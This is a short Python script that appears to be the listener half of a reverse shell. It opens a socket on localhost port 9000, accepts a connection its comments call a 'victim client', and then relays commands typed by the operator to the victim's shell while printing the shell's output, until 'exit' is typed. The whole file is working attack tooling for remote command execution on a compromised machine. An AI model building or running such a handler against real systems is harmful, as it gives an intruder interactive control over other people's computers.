from socket import *

# Setup server to issue commands
sock = socket(AF_INET, SOCK_STREAM)
sock.bind(("localhost", 9000))

# Accept victim client connection
sock.listen(1)
target, addr = sock.accept()


command = ''
while command != 'exit':

  # Read any output from victic shell
  output = target.recv(2048).decode()
  print(output, end='', flush=True)

  # Issue command from user input
  command = input()
  target.send((command + '\n').encode())

# Cleanup resources
target.close()
sock.close()